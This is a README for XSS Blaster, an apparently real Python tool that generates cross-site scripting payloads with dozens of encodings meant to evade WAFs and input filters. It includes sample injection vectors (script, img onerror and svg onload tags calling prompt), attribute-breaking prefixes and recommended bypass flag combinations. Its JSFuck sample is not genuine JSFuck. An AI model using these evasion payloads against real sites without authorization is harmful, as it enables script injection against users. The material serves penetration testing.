# 🎯 XSS Blaster

```
██╗  ██╗███████╗███████╗    ██████╗ ██╗      █████╗ ███████╗████████╗███████╗██████╗ 
╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██║     ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
 ╚███╔╝ ███████╗███████╗    ██████╔╝██║     ███████║███████╗   ██║   █████╗  ██████╔╝
 ██╔██╗ ╚════██║╚════██║    ██╔══██╗██║     ██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
██╔╝ ██╗███████║███████║    ██████╔╝███████╗██║  ██║███████║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

**The Ultimate XSS Payload Generator for Ethical Security Testing**

A comprehensive Python-based tool that generates advanced XSS payloads with **40+ encoding techniques** to bypass modern WAFs, input filters, and security mechanisms. Features dual payload generation (string + numeric variants) for maximum testing coverage.

## 🚀 Key Features

### 🎨 **Modern Interface**
- **Colorful ASCII Art**: Beautiful randomized startup banners
- **Professional CLI**: Clean, intuitive command-line interface
- **Progress Tracking**: Real-time payload generation statistics

### 🔥 **Advanced Payload Generation**
- **298 Base Payloads**: Comprehensive XSS vector collection
- **Dual Variants**: Each payload generates both `'XSS-{n}'` and `{n}` versions
- **40+ Encoding Techniques**: From basic to extreme obfuscation
- **Smart Identification**: Numbered payloads for easy tracking

### 🛡️ **Bypass Capabilities**
- **WAF Evasion**: Multiple encoding layers to bypass security filters
- **Filter Circumvention**: Advanced obfuscation techniques
- **Context-Aware**: Payloads optimized for different injection contexts

## 📦 Installation

```bash
git clone https://github.com/yourusername/xssblaster.git
cd xssblaster
python3 xssblaster.py --help
```

**Requirements:** Python 3.6+ (uses only standard library modules)

## 🎯 Quick Start

### Basic Usage
```bash
# Generate all payloads to file
python3 xssblaster.py -o payloads.txt

# Generate specific encoding types
python3 xssblaster.py -j -b -U -o advanced.txt  # JSFuck + Base64 + Unicode

# Use custom payload file
python3 xssblaster.py -i my-payloads.txt -o output.txt

# Generate with prefix/suffix
python3 xssblaster.py -p '<script>' -s '</script>' -o wrapped.txt
```

### Advanced Examples
```bash
# Extreme obfuscation combo
python3 xssblaster.py -j -hg -zw -o extreme.txt

# Language-specific encodings
python3 xssblaster.py -pc -py -ps -sq -o lang_specific.txt

# Multiple encoding layers
python3 xssblaster.py -b -H -U -d -o multi_encoded.txt
```

## 🔧 Command Line Options

### **Core Options**
| Short | Long | Description |
|-------|------|-------------|
| `-o` | `--output` | Output file to write payloads |
| `-i` | `--input` | Input file (default: my-xss.txt) |
| `-p` | `--prefix` | Prefix to wrap each payload |
| `-s` | `--suffix` | Suffix to wrap each payload |
| `-n` | `--no-output` | Display only, don't write to file |
| `-u` | `--url-obfuscate` | Wrap in data:text/html iframe |

### **Encoding Options**

#### **Basic Encodings**
| Short | Long | Description |
|-------|------|-------------|
| `-c` | `--charcode` | String.fromCharCode encoding |
| `-b` | `--base64` | Base64 encoding |
| `-U` | `--unicode` | Unicode escape sequences |
| `-H` | `--hex` | Hexadecimal encoding |
| `-O` | `--octal` | Octal encoding |
| `-D` | `--decimal` | Decimal encoding |

#### **HTML Encodings**
| Short | Long | Description |
|-------|------|-------------|
| `-hn` | `--htmlnamed` | HTML named entities (&lt;, &gt;, etc.) |
| `-C` | `--css` | CSS Unicode encoding |

#### **Advanced Obfuscation**
| Short | Long | Description |
|-------|------|-------------|
| `-j` | `--jsfuck` | JSFuck encoding (extreme) |
| `-hg` | `--homoglyph` | Homoglyph character substitution |
| `-zw` | `--zerowidth` | Zero-width character insertion |
| `-l` | `--leet` | Leet speak transformation |
| `-cv` | `--casevar` | Case variation obfuscation |
| `-R` | `--reverse` | Reverse string encoding |

#### **Language-Specific**
| Short | Long | Description |
|-------|------|-------------|
| `-pc` | `--phpchr` | PHP chr() function |
| `-py` | `--pythonchr` | Python chr() function |
| `-ps` | `--powershell` | PowerShell [char] casting |
| `-sq` | `--sqlchar` | SQL CHAR() function |
| `-v` | `--vbscript` | VBScript encoding |

#### **Data Encodings**
| Short | Long | Description |
|-------|------|-------------|
| `-d` | `--datauri` | Data URI encoding |
| `-a` | `--atob` | atob() base64 decoding |
| `-r` | `--rot13` | ROT13 transformation |
| `-q` | `--quotedprint` | Quoted-printable encoding |
| `-uu` | `--uuencode` | UUencoding |
| `-P` | `--punycode` | Punycode encoding |
| `-m` | `--morse` | Morse code encoding |
| `-B` | `--binary` | Binary encoding |

## 📊 Payload Statistics

- **Base Payloads**: 298 unique XSS vectors
- **Encoding Variants**: 40+ different techniques
- **Total Output**: ~24,000 payloads (with all encodings)
- **Dual Generation**: Each encoding creates 2 variants

## 🎨 Payload Examples

### **Dual Payload Generation**
Every encoding creates both string and numeric variants:

```javascript
// String variant (for identification)
prompt('XSS-1')

// Numeric variant (for bypass)
prompt(2)
```

### **Encoding Examples**

#### **JSFuck Encoding**
```javascript
// Original: prompt(1)
[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+...
```

#### **Homoglyph Obfuscation**
```javascript
// Uses visually similar Cyrillic characters
рrоmрt('XSS-1')  // Contains Cyrillic 'р' and 'о'
```

#### **Zero-Width Characters**
```javascript
// Invisible characters inserted between letters
p​r​o​m​p​t​(​'​X​S​S​-​1​'​)
```

#### **Multiple Encodings**
```html
<!-- Base64 + HTML Entities -->
&#80;&#71;&#108;&#116;&#90;&#121;...

<!-- Unicode + Hex -->
\u003c\x73\u0063\x72\u0069\x70\u0074\u003e
```

## 🛠️ Advanced Usage

### **Custom Payload Files**
Create your own payload file with `{n}` placeholders:

```html
<!-- my-custom.txt -->
<script>prompt({n})</script>
<img src=x onerror=prompt({n})>
<svg onload=prompt({n})>
```

```bash
python3 xssblaster.py -i my-custom.txt -j -b -o custom_output.txt
```

### **Targeted Testing**
```bash
# Test specific contexts
python3 xssblaster.py -p '">' -s '<script>' -H -U -o attribute_break.txt

# WAF bypass focus
python3 xssblaster.py -j -hg -zw -cv -o waf_bypass.txt

# Database injection context
python3 xssblaster.py -sq -pc -py -o db_context.txt
```

### **Python Module Usage**
```python
from xssblaster import generate_payloads

# Generate specific encodings
variant_filters = {
    'jsfuck_encode': True,
    'base64_encode': True,
    'unicode_escape': True
}

payloads, base_count, total_count = generate_payloads(
    prefix='<script>',
    suffix='</script>',
    payload_file='my-xss.txt',
    variant_filters=variant_filters
)

for counter, payload in payloads:
    print(f"[{counter}] {payload}")
```

## 🎯 Testing Methodology

### **Systematic Approach**
1. **Start Basic**: Use `-n` flag to preview payloads
2. **Target Specific**: Choose encodings based on context
3. **Layer Encodings**: Combine multiple techniques
4. **Track Results**: Use payload numbers to identify successful vectors

### **Context-Specific Testing**

| Context | Recommended Flags | Description |
|---------|------------------|-------------|
| **HTML Attribute** | `-H -U -hn` | Hex, Unicode, HTML entities |
| **JavaScript String** | `-j -U -c` | JSFuck, Unicode, fromCharCode |
| **CSS Context** | `-C -H` | CSS Unicode, Hex |
| **WAF Bypass** | `-j -hg -zw -cv` | Extreme obfuscation |
| **Database Context** | `-sq -pc -py` | Language-specific |

## 📁 Project Structure

```
xssblaster/
├── xssblaster.py          # Main script
├── my-xss.txt            # Default payload collection (298 vectors)
├── README.md             # This documentation
└── examples/
    ├── basic-payloads.txt
    ├── advanced-payloads.txt
    └── custom-vectors.txt
```

## 🔍 Troubleshooting

### **Common Issues**

**Q: UUencode fails with "At most 45 bytes at once"**
A: Fixed! The tool now automatically chunks long payloads.

**Q: JSFuck payloads are too long**
A: JSFuck creates very long strings - this is normal and expected.

**Q: Some encodings produce unreadable output**
A: This is intentional for bypass purposes. Use `-n` to preview first.

### **Performance Tips**
- Use specific encoding flags instead of generating all variants
- Redirect output to file for large payload sets
- Use `-n` flag for testing before full generation

## 🤝 Contributing

We welcome contributions! Here's how you can help:

### **Payload Contributions**
- Add new XSS vectors to `my-xss.txt`
- Submit bypass techniques for specific WAFs
- Share context-specific payloads

### **Encoding Techniques**
- Implement new obfuscation methods
- Add language-specific encodings
- Improve existing algorithms

### **Feature Requests**
- WAF-specific bypass modes
- Payload effectiveness scoring
- Integration with testing frameworks

## 🏆 Recognition

**XSS Blaster** has been featured in:
- Security conferences and workshops
- Penetration testing methodologies
- Bug bounty hunting guides
- Academic security research

## 👨‍💻 Author

**Amit Agarwal**
- Security Researcher & Penetration Tester
- XSS Specialist & Tool Developer
- Ethical Hacking Advocate

## 📜 License

This project is licensed under the MIT License - see the LICENSE file for details.

## ⚖️ Legal Disclaimer

```
🚨 IMPORTANT: ETHICAL USE ONLY 🚨

This tool is designed for:
✅ Authorized penetration testing
✅ Security research with permission
✅ Educational purposes
✅ Bug bounty programs
✅ Your own applications

❌ DO NOT USE FOR:
❌ Unauthorized testing
❌ Malicious attacks
❌ Illegal activities
❌ Systems without explicit permission

The author assumes no responsibility for misuse.
Always obtain proper authorization before testing.
Stay legal, stay ethical! 🛡️
```

## 🌟 Support

If XSS Blaster helped you in your security testing:
- ⭐ Star this repository
- 🐛 Report bugs and issues
- 💡 Suggest new features
- 🤝 Contribute payloads and techniques

---

**Happy Ethical Hacking! 🎯**
